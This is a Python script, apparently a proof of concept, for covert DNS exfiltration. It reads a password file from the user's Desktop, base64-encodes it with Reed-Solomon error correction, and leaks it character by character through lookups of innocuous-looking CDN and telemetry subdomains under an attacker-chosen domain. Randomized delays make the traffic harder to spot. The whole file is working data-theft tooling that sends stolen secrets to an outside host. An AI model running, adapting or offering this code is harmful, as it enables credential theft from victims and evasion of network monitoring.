###*** DNS CLIENT ***###
import time
import random
import base64
import os
import socket
from reedsolo import RSCodec # for ECC

my_domain = "" # EDIT WITH DOMAIN NAME

# target file
file_path = os.path.expanduser("~/Desktop/password.txt")

#for ECC
rsc = RSCodec(16)

# maps domains to base64 char (can be lists too but just simple as proof of concept: ALL LOWER CASE)
b64_mapping = {
    "A": "cdn.baacons",
    "B": "handoff-beacons",
    "C": "self.events.data",
    "D": "events-data-manager.beacons",
    "E": "events-data-manager",
    "F": "gcp.loggings",
    "G": "static.teams",
    "H": "us-prod.cdn",
    "I": "this-is-just.a.test",
    "J": "ui-1.cdn",
    "K": "cdn.cdn",
    "L": "beacons",
    "M": "ui-ctld.1",
    "N": "gui-ctl",
    "O": "signal.beacons",
    "P": "ai.gui.2",
    "Q": "console.beacons.cdn",
    "R": "ss1.gui.static",
    "S": "client.gui.ui.cdn-1.static",
    "T": "android.l.pickle",
    "U": "my.teams.tasks",
    "V": "update.ui.5.handoff",
    "W": "gvt5.handoff.beacons",
    "X": "signaler-pa.1.beacons.handoff.cdn",
    "Y": "p-th-clarity.client.ui",
    "Z": "assets.suite.cdn",
    "a": "ecn.dev",
    "b": "cdn.dev.1.client",
    "c": "cdn.1.msn.assets",
    "d": "cdn.2.msn.assets",
    "e": "cdn.3.msn.assets",
    "f": "cdn.4.msn.assets",
    "g": "assets.ns.beacons.ai",
    "h": "client-1.gui.cdn.aka-ns1",
    "i": "beacons.handoff.beacons-handoff.1",
    "j": "assets.my-server.1",
    "k": "assets.presence.cdn.1.server",
    "l": "ps-a1.server",
    "m": "pk-pa.1.cdn.handoff",
    "n": "teams.static.pk-1",
    "o": "substrate",
    "p": "browser.check.ui-1",
    "q": "server-cdn.server-b.server-1",
    "r": "ui.server-cdn.1.2",
    "s": "cdn-my-server.1.handoff",
    "t": "assets.msn-my-task",
    "u": "calendar.beacons.assets",
    "v": "traffic.stats.1.beacons",
    "w": "cdn-1.traffics.static.beacons.handoff-1",
    "x": "ooc-g2.tm-4.my-server.cdn",
    "y": "other-side.cdn.server",
    "z": "play.beacons.handoff.server",
    "0": "static.edge.key",
    "1": "a223.dscd.cdn",
    "2": "a22.pk-pa.1.cdn.handoff",
    "3": "that.5.beacons.cdn",
    "4": "cdn.teams.my-task",
    "5": "ns.cdn.teams.my-server.beacons",
    "6": "ssl.events.data.my-server.1",
    "7": "pk-eop.ui.beacons",
    "8": "nexus.prod.cdn",
    "9": "nexus.prod.server.dns.cdn-1",
    "+": "plus-end.events.data",
    "/": "sdn.clients.pa-client.6",
    "=": "open.signal.my-server.cdn",
    "end": "assets-pa-0.cdn.beacons.1.handoff"
}

# SEND CHAR BY QUERING DOMAINS
def send_char(char, count, full):
    domain = b64_mapping[char] + "." + my_domain
    try:
        socket.gethostbyname(domain)
        print(f"[<{count}/{full}>] Sent bit {char} -> {domain}")
    except Exception as e:
        print(f"[!] DNS query failed: {e}")
        
# ENCODES FILE AS BASE64
def file_to_base64(filepath):
    with open(filepath, 'rb') as f:
        content = f.read()
    return base64.b64encode(content)

# ADDS ECC AND RETURNS ASCII VER OF BYTE INPUT
def ecc(chars):
    chars_with_ecc = rsc.encode(chars)
    return base64.b64encode(chars_with_ecc).decode('ascii')

# MAIN FUNCTION
def exfiltrate():
    count = 1
    if not os.path.exists(file_path):
        print(f"[!] File not found: {file_path}")
        return

    print(f"[~] Reading file: {file_path}")
    b64_raw = file_to_base64(file_path)
    b64 = ecc(b64_raw) # with ecc

    expected_b64 = rsc.decode(base64.b64decode(b64))[0]
    print(f"[~] B64 to send: {b64} ({len(b64)} chars)... \n"
          f"Expected: {expected_b64} == {base64.b64decode(expected_b64)}")

    for char in b64:
        delay = random.randint(16, 30)
        send_char(char, count, len(b64))
        time.sleep(delay)
        count += 1

    try:
        socket.gethostbyname(b64_mapping["end"] + "." + my_domain) # END
        print("[*] Transmission complete.")
    except Exception as e:
        print(f"[!] End signal failed: {e}")

if __name__ == "__main__":
    exfiltrate()
